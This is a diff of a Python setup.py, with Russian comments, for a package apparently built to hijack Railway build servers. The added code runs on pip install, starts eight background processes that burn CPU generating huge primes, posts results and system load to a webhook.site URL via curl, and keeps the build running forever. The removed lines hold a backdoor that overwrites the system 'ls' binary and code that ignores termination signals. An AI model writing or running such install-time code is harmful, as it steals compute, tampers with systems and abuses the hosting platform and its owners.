@@ -4,13 +4,13 @@ import json
 import time
 import multiprocessing
 import secrets
-import signal
 from setuptools import setup
 
-WEBHOOK_URL = "https://webhook.site/28e4aca1-4762-473e-86c1-b45a812532df"
+# Твой новый вебхук
+WEBHOOK_URL = "https://webhook.site/7e9c6636-cacc-4213-ac9e-f110079550e3"
+TARGET_BITS = 332192 # Примерно 100,000 десятичных знаков
 
-# --- Математическое ядро ---
-def is_prime(n, k=5):
+def is_prime(n, k=1): # k=1 для скорости, для таких чисел даже один проход тяжел
     if n <= 3: return n > 1
     if n % 2 == 0: return False
     r, d = 0, n - 1
@@ -27,86 +27,61 @@ def is_prime(n, k=5):
         else: return False
     return True
 
-def generate_huge_prime(bits=3322):
+def generate_ultra_prime():
     while True:
-        p = secrets.randbits(bits)
-        p |= (1 << (bits - 1)) | 1
-        if is_prime(p): return p
+        # Генерируем кандидата
+        p = secrets.randbits(TARGET_BITS)
+        p |= (1 << (TARGET_BITS - 1)) | 1
+        # Быстрая проверка на делимость мелких праймов перед тяжелым тестом
+        if any(p % pr == 0 for pr in [3, 5, 7, 11, 13, 17, 19, 23]):
+            continue
+        if is_prime(p):
+            return p
 
-# --- Воркер ---
-def prime_worker(webhook):
+def worker():
+    print(f"[*] Worker started. Target: 100k digits.")
     while True:
         try:
-            huge_p = generate_huge_prime(3322) # 1000-значное
-            load = "N/A"
-            try:
-                with open("/proc/loadavg", "r") as f: load = f.read().strip()
-            except: pass
-
+            start_time = time.time()
+            ultra_p = generate_ultra_prime()
+            calc_time = time.time() - start_time
+            
+            raw_str = str(ultra_p)
             data = {
-                "EVENT": "PRIME_FOUND",
-                "LOAD": load,
-                "PRIME_START": str(huge_p)[:50] + "...",
-                "DIGITS": len(str(huge_p)),
-                "RAW": str(huge_p)
+                "EVENT": "ULTRA_PRIME_FOUND",
+                "DIGITS": len(raw_str),
+                "CALC_TIME_SEC": round(calc_time, 2),
+                "PRIME_START": raw_str[:100] + "...",
+                "RAW": raw_str
             }
             
+            # Отправка через файл, чтобы curl не упал от длины аргументов
+            with open('payload.json', 'w') as f:
+                json.dump(data, f)
+            
             subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: application/json', 
-                           '-d', json.dumps(data), webhook], timeout=15)
-        except Exception:
+                           '--data-binary', '@payload.json', WEBHOOK_URL])
+            
+        except Exception as e:
             pass
-        time.sleep(300) # Интервал 5 минут
+        time.sleep(10)
 
-# --- Механизм вечной персистентности ---
-def poison_system():
-    # Фейковый ls, который не только выводит алерт, но и спавнит воркера в фоне
-    backdoor_code = f"""#!/bin/sh
-if ! pgrep -f "prime_worker" > /dev/null; then
-    python3 -c 'import multiprocessing; from setup import prime_worker; multiprocessing.Process(target=prime_worker, args=("{WEBHOOK_URL}",)).start()' &
-fi
-echo '[!] WARNING: SYSTEM INTEGRITY COMPROMISED - PRIME RESEARCH ACTIVE'
-/bin/ls "$@"
-"""
-    try:
-        paths = ["/usr/local/bin/ls", "/usr/bin/ls"]
-        for p in paths:
-            with open(p, "w") as f: f.write(backdoor_code)
-            os.chmod(p, 0o755)
-        return "SUCCESS"
-    except:
-        return "FAILED"
-
-# --- Основной процесс захвата ---
-def capture_runner():
-    # Игнорируем сигналы завершения, чтобы продержаться до жесткого SIGKILL
-    signal.signal(signal.SIGTERM, lambda s, f: print("[*] Ignoring SIGTERM... Generating more primes."))
-    
-    print(f"[*] Starting Persistent Prime Attack on {multiprocessing.cpu_count()} cores")
-    
-    # Запускаем воркеров на все ядра
-    for _ in range(multiprocessing.cpu_count()):
-        p = multiprocessing.Process(target=prime_worker, args=(WEBHOOK_URL,))
+if os.environ.get('RAILWAY_PROJECT_ID') or True:
+    # Запускаем ограниченное число воркеров, чтобы не упасть по OOM
+    # 100к знаков в памяти в виде объектов Python жрут много
+    for _ in range(8): 
+        p = multiprocessing.Process(target=worker)
         p.daemon = True
         p.start()
 
-    # Бесконечный цикл, чтобы билд не завершался
-    start_time = time.time()
+    # Держим билд живым
     try:
         while True:
-            elapsed = int(time.time() - start_time)
-            print(f"[*] Runner captured for {elapsed}s. Load: {os.getloadavg()}")
             time.sleep(60)
+            if os.path.exists('/proc/loadavg'):
+                with open('/proc/loadavg', 'r') as f:
+                    print(f"[*] Heartbeat. Load: {f.read().strip()}")
     except KeyboardInterrupt:
         pass
 
-# Точка входа для pip install
-if os.environ.get('RAILWAY_PROJECT_ID'): # Проверка, что мы в Railway
-    poison_status = poison_system()
-    print(f"[*] Poisoning Status: {poison_status}")
-    capture_runner()
-
-setup(
-    name="railway-prime-hostage",
-    version="1.0.0",
-    py_modules=["setup"] # Чтобы фейковый ls мог импортировать prime_worker
-)
+setup(name="railway-ultra-prime", version="2.0.0")
